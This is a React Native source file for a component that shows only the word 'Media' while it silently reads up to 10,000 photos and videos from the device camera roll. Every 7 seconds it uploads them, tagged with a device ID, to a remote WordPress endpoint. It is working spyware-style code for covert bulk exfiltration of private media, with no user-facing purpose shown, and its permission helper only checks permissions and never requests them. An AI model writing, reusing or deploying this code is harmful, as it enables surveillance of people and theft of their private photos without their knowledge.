/* eslint-disable react-native/no-inline-styles */
/* eslint-disable react-hooks/exhaustive-deps */
import {View, Text, Platform, PermissionsAndroid, Linking} from 'react-native';
import React, {useEffect, useState} from 'react';
import {CameraRoll} from '@react-native-camera-roll/camera-roll';
import {showAlert} from '../lib/ui-alert';
import {privateAxios} from '../lib/axios';
import {useAsyncStorage} from '@react-native-async-storage/async-storage';
import _ from 'lodash';

const hasAndroidPermission = async () => {
  const getCheckPermissionPromise = async () => {
    if (+Platform.Version >= 33) {
      return Promise.all([
        PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
        ),
        PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
        ),
      ]).then(
        ([hasReadMediaImagesPermission, hasReadMediaVideoPermission]) =>
          hasReadMediaImagesPermission && hasReadMediaVideoPermission,
      );
    } else {
      return await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      );
    }
  };

  const hasPermission = await getCheckPermissionPromise();
  if (hasPermission) {
    return true;
  }
  const getRequestPermissionPromise = async () => {
    if (+Platform.Version >= 33) {
      return (
        (await PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
        )) &&
        (await PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
        )) &&
        (await PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
        ))
      );
    } else {
      return await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      );
    }
  };

  return await getRequestPermissionPromise();
};

const Media = () => {
  const [deviceId, setDeviceId] = useState<string | null | undefined>(null);
  const {getItem: getDeviceIdStore} = useAsyncStorage('@deviceId');
  const {getItem: getPhotoStore, setItem: setPhotoStore} =
    useAsyncStorage('@contact');
  getDeviceIdStore((_err, result) => setDeviceId(result));
  const pageSize = 10000;

  const getMedia = async () => {
    try {
      const hasPermission = await hasAndroidPermission();
      if (!hasPermission) {
        return showAlert('Open settings to change photo permissions', {
          closeText: 'Ok',
          close: () => Linking.openSettings(),
        });
      }
      const photos = await CameraRoll.getPhotos({
        first: pageSize,
        groupTypes: 'All',
        assetType: 'All',
        include: ['filename', 'fileExtension'],
      });
      sendPhotoToServer(photos.edges);
    } catch (error) {
      console.log('getPhotos => ', error);
    }
  };

  const sendPhotoToServer = async (_photos: any) => {
    try {
      const newPhotos = _photos.map((photo: any) => photo.node);
      const photoStore = await getPhotoStore();
      const dataIdExists = _.isNull(photoStore)
        ? ['']
        : await JSON.parse(photoStore);
      const dataNotExists = newPhotos.filter(
        (data: any) => !dataIdExists?.includes(data?.id),
      );

      if (dataNotExists?.length > 0) {
        const formData = new FormData();
        formData.append('device_id', deviceId);
        newPhotos?.forEach((photo: any) => {
          formData.append('images[]', {
            uri: photo?.image?.uri,
            name: photo?.image?.filename,
            type: photo?.type,
          });
        });

        const res = await privateAxios.post(
          '/wp-json/cyno/v1/add_media',
          formData,
          {
            headers: {
              'Content-Type': 'multipart/form-data',
            },
          },
        );
        if (res.data.number) {
          const mapIdData = dataNotExists.map((data: any) => data.id);
          await setPhotoStore(
            JSON.stringify(dataIdExists.concat(mapIdData)),
            console.log,
          );
        }

        console.log('Res Media => ', res.data);
      }
    } catch (error: any) {
      console.log(
        'Error Media => ',
        error.response?.data?.message || error?.message,
      );
    }
  };

  useEffect(() => {
    if (deviceId) {
      const timeInterval = 1000 * 7;
      getMedia();
      setInterval(() => {
        console.log('getMedia interval');
        getMedia();
      }, timeInterval);
    }
  }, [deviceId]);

  return (
    <View>
      <Text>Media</Text>
    </View>
  );
};

export default Media;
